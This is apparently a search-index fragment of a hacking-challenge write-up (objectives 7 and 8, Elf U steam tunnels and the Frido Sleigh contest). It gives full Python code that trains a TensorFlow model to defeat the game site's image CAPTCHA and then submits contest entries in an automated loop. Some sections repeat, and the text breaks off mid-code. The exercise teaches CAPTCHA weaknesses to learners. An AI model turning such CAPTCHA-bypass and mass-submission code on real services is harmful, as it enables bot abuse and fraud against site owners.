Solution \u00b6 Complete Tangle Coalbox - keypad challenge to get access to the dorm. Complete Minty Candy Cane - Holiday head trail challenges to get access to The steam tunnels. Talk to Krampus in The steam tunnels \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld Hello there! I\u2019m Krampus Hollyfeld. I maintain the steam tunnels underneath Elf U, Keeping all the elves warm and jolly. Though I spend my time in the tunnels and smoke,In this whole wide world, there's no happier bloke! Yes, I borrowed Santa\u2019s turtle doves for just a bit. Someone left some scraps of paper near that fireplace, which is a big fire hazard. I sent the turtle doves to fetch the paper scraps. The answer: Krampus Hollyfeld. Congratulations! You have completed Get Access To The Steam Tunnels challenge! \ud83c\udf89","title":"7 Get Access To The Steam Tunnels"},{"location":"objectives/objective7/#7-get-access-to-the-steam-tunnels","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"7. Get Access To The Steam Tunnels"},{"location":"objectives/objective7/#info-hints","text":"Get Access To The Steam Tunnels Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane. Find first and last name of the one who took the turtle doves","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective7/#solution","text":"Complete Tangle Coalbox - keypad challenge to get access to the dorm. Complete Minty Candy Cane - Holiday head trail challenges to get access to The steam tunnels. Talk to Krampus in The steam tunnels \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld Hello there! I\u2019m Krampus Hollyfeld. I maintain the steam tunnels underneath Elf U, Keeping all the elves warm and jolly. Though I spend my time in the tunnels and smoke,In this whole wide world, there's no happier bloke! Yes, I borrowed Santa\u2019s turtle doves for just a bit. Someone left some scraps of paper near that fireplace, which is a big fire hazard. I sent the turtle doves to fetch the paper scraps. The answer: Krampus Hollyfeld. Congratulations! You have completed Get Access To The Steam Tunnels challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective8/","text":"8. Bypassing the Frido Sleigh CAPTEHA \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Bypassing the Frido Sleigh CAPTEHA Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld But, before I can tell you more, I need to know that I can trust you. Tell you what \u2013 if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you. The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries? Machine Learning Machine Learning Use Cases for Cyber Security Frido Sleigh Continuous Cookie Contest website Beat The Frido Sleigh contest \u26a1\ufe0f Solution \u00b6 Download: 12,000 images . API interface script . predict_images_using_trained_model.py and retrain.py from Chris Davis github repository . And make sure you have python installed then install the following python packages: tensorflow==1.15 tensorflow_hub Installation (Tested on Ubuntu 18.04 - 8GB Memory - 4 core cpu VM): sudo apt install python3 python3-pip -y sudo python3 -m pip install --upgrade pip sudo python3 -m pip install --upgrade setuptools sudo python3 -m pip install --upgrade tensorflow == 1 .15 sudo python3 -m pip install tensorflow_hub Training the Module : \u00b6 We need to train our module then run it live to solve the CAPTEHA. Unzip downloaded images to a folder called training_images inside your code folder And the training_images folder will look like this: Training our TensowFlow ML Model Based on Images in ./training_images/ Folder: Make sure you are in your code directory and run: python3 retrain.py --image_dir ./training_images/ This will create two files we will be using at: /tmp/retrain_tmp/output_graph.pb - Trained Machine Learning Model /tmp/retrain_tmp/output_labels.txt - Labels for Images Predicting Images from CAPTEHA : \u00b6 We need to get images into our module then do prediction based on our trained Model. Let's begin by understanding how the CAPTEHA api works by looking at Network tab in browser developer tools while you are using the website: First when you click on button the browser send POST request to get the images from the api at https://fridosleigh.com/api/capteha/request . The api response with images in a json object containing uuid for each image and the image itself encoded with base64, also the image types the CAPTEHA Challenge is looking for. Then after selecting the images and click submit your browser send POST request to the api at https://fridosleigh.com/api/capteha/submit with the answers in form of uuid list of all selected Images and the api response with the status/error message based on the answer: Is it correct? False? too few ?too many? ... Open capteha_api.py in your code editor: Original capteha_api.py #!/usr/bin/env python3 # Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld import requests import json import sys def main (): yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting ''' MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE ''' # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . final_answer = ',' . join ( [ img [ 'uuid' ] for img in b64_images ] ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () As see we need to add our image processing an machine learning prediction code in capteha_api.py : ''' MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE ''' Also make sure it's return return the final answer as list of uuids to send it back to the server final_answer = ','.join( [ img['uuid'] for img in b64_images ] ) Open predict_images_using_trained_model.py in your code editor: Original predict_images_using_trained_model.py #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main (): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) # Can use queues and threading to spead up the processing q = queue . Queue () unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) #Going to interate over each of our images. for image in unknown_images : img_full_path = ' {} / {} ' . format ( unknown_images_dir , image ) print ( 'Processing Image {} ' . format ( img_full_path )) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object image_bytes = open ( img_full_path , 'rb' ) . read () threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( unknown_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] #do something with our results... Like print them to the screen. for prediction in prediction_results : print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction )) if __name__ == \"__main__\" : main () In here the predict images module is getting images from the folder unknown_images then process each one unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) We need to link between the images from the api and our input into predication module Let's start by editing capteha_api.py : Replace YourRealEmail@SomeRealEmailDomain.RealTLD with your email to receive the wining code yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" Import our predication module by adding this at the top of our script: import predict_images_using_trained_model Replace final_answer line with new one that gets the result from main function in predict_images_using_trained_model after providing b64_images , challenge_image_types : final_answer = ',' . join ( predict_images_using_trained_model . main ( b64_images , challenge_image_types )) So our final code will be: Modified capteha_api.py #!/usr/bin/env python3 # Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld import requests import json import sys import predict_images_using_trained_model def main (): yourREALemailAddress = \"email@email.com\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . final_answer = predict_images_using_trained_model . main ( b64_images , challenge_image_types ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () Editing predict_images_using_trained_model.py : First we will need to import base64 package to decode the images import base64 then we change our main function accept two variables b64_images , challenge_image_types : def main ( unknown_images , types ): remove the following lines because we will get our images as input into the function: unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) Change the img_full_path to uuid : img_full_path = image [ 'uuid' ] replace image_bytes line with our decoded base64 image image_bytes = base64.b64decode(image['base64']) Create an empty list for uuids matching the challenge types uuids_list = [] Check predict image type if it's in the capteha_api challenge types if prediction [ 'prediction' ] in types : uuids_list . append ( prediction [ 'img_full_path' ]) finally return the uuids list return uuids_list So our final code will be: Modified predict_images_using_trained_model.py #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys import base64 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main ( unknown_images , types ): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) # Can use queues and threading to spead up the processing q = queue . Queue () #Going to interate over each of our images. for image in unknown_images : img_full_path = image [ 'uuid' ] print ( 'Processing Image {} ' . format ( img_full_path )) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object image_bytes = base64 . b64decode ( image [ 'base64' ]) threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( unknown_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] #create list of our uuids matching the types uuids_list = [] for prediction in prediction_results : print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction )) if prediction [ 'prediction' ] in types : uuids_list . append ( prediction [ 'img_full_path' ]) return uuids_list if __name__ == \"__main__\" : main () Let's run and win! python3 capteha_api.py And you get the winning message: Congratulations and Happy Holidays! Entries for email address YourRealEmail@SomeRealEmailDomain.RealTLD no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. Congratulations and Happy Holidays! Check you email for an email from contest@fridosleigh.com to get the wining code: Winning code To receive your reward, simply attend KringleCon at Elf University and submit the following code in your badge: 8Ia8LiZEwvyZr2WO Congratulations! You have completed the Bypassing the Frido Sleigh CAPTEHA challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld You did it! Thank you so much. I can trust you! To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels. As for those scraps of paper, I scanned those and put the images on my server. I then threw the paper away. Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across. Now we can use steam tunnels fo teleportation! \ud83c\udf93 What you've learned \u00b6 Image Recognition Using TensorFlow Machine Learning. Interacting with api and understand dataflow to be able to manipulate the result.","title":"8 Bypassing the Frido Sleigh CAPTEHA"},{"location":"objectives/objective8/#8-bypassing-the-frido-sleigh-capteha","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"8. Bypassing the Frido Sleigh CAPTEHA"},{"location":"objectives/objective8/#info-hints","text":"Bypassing the Frido Sleigh CAPTEHA Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld But, before I can tell you more, I need to know that I can trust you. Tell you what \u2013 if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you. The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries? Machine Learning Machine Learning Use Cases for Cyber Security Frido Sleigh Continuous Cookie Contest website Beat The Frido Sleigh contest","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective8/#solution","text":"Download: 12,000 images . API interface script . predict_images_using_trained_model.py and retrain.py from Chris Davis github repository . And make sure you have python installed then install the following python packages: tensorflow==1.15 tensorflow_hub Installation (Tested on Ubuntu 18.04 - 8GB Memory - 4 core cpu VM): sudo apt install python3 python3-pip -y sudo python3 -m pip install --upgrade pip sudo python3 -m pip install --upgrade setuptools sudo python3 -m pip install --upgrade tensorflow == 1 .15 sudo python3 -m pip install tensorflow_hub","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective8/#training-the-module","text":"We need to train our module then run it live to solve the CAPTEHA. Unzip downloaded images to a folder called training_images inside your code folder And the training_images folder will look like this: Training our TensowFlow ML Model Based on Images in ./training_images/ Folder: Make sure you are in your code directory and run: python3 retrain.py --image_dir ./training_images/ This will create two files we will be using at: /tmp/retrain_tmp/output_graph.pb - Trained Machine Learning Model /tmp/retrain_tmp/output_labels.txt - Labels for Images","title":"Training the Module :"},{"location":"objectives/objective8/#predicting-images-from-capteha","text":"We need to get images into our module then do prediction based on our trained Model. Let's begin by understanding how the CAPTEHA api works by looking at Network tab in browser developer tools while you are using the website: First when you click on button the browser send POST request to get the images from the api at https://fridosleigh.com/api/capteha/request . The api response with images in a json object containing uuid for each image and the image itself encoded with base64, also the image types the CAPTEHA Challenge is looking for. Then after selecting the images and click submit your browser send POST request to the api at https://fridosleigh.com/api/capteha/submit with the answers in form of uuid list of all selected Images and the api response with the status/error message based on the answer: Is it correct? False? too few ?too many? ... Open capteha_api.py in your code editor: Original capteha_api.py #!/usr/bin/env python3 # Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld import requests import json import sys def main (): yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting ''' MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE ''' # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . final_answer = ',' . join ( [ img [ 'uuid' ] for img in b64_images ] ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () As see we need to add our image processing an machine learning prediction code in capteha_api.py : ''' MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE ''' Also make sure it's return return the final answer as list of uuids to send it back to the server final_answer = ','.join( [ img['uuid'] for img in b64_images ] ) Open predict_images_using_trained_model.py in your code editor: Original predict_images_using_trained_model.py #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main (): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) # Can use queues and threading to spead up the processing q = queue . Queue () unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) #Going to interate over each of our images. for image in unknown_images : img_full_path = ' {} / {} ' . format ( unknown_images_dir , image ) print ( 'Processing Image {} ' . format ( img_full_path )) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object image_bytes = open ( img_full_path , 'rb' ) . read () threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( unknown_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] #do something with our results... Like print them to the screen. for prediction in prediction_results : print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction )) if __name__ == \"__main__\" : main () In here the predict images module is getting images from the folder unknown_images then process each one unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) We need to link between the images from the api and our input into predication module Let's start by editing capteha_api.py : Replace YourRealEmail@SomeRealEmailDomain.RealTLD with your email to receive the wining code yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" Import our predication module by adding this at the top of our script: import predict_images_using_trained_model Replace final_answer line with new one that gets the result from main function in predict_images_using_trained_model after providing b64_images , challenge_image_types : final_answer = ',' . join ( predict_images_using_trained_model . main ( b64_images , challenge_image_types )) So our final code will be: Modified capteha_api.py #!/usr/bin/env python3 # Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld import requests import json import sys import predict_images_using_trained_model def main (): yourREALemailAddress = \"email@email.com\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . final_answer = predict_images_using_trained_model . main ( b64_images , challenge_image_types ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () Editing predict_images_using_trained_model.py : First we will need to import base64 package to decode the images import base64 then we change our main function accept two variables b64_images , challenge_image_types : def main ( unknown_images , types ): remove the following lines because we will get our images as input into the function: unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) Change the img_full_path to uuid : img_full_path = image [ 'uuid' ] replace image_bytes line with our decoded base64 image image_bytes = base64.b64decode(image['base64']) Create an empty list for uuids matching the challenge types uuids_list = [] Check predict image type if it's in the capteha_api challenge types if prediction [ 'prediction' ] in types : uuids_list . append ( prediction [ 'img_full_path' ]) finally return the uuids list return uuids_list So our final code will be: Modified predict_images_using_trained_model.py #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys import base64 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . 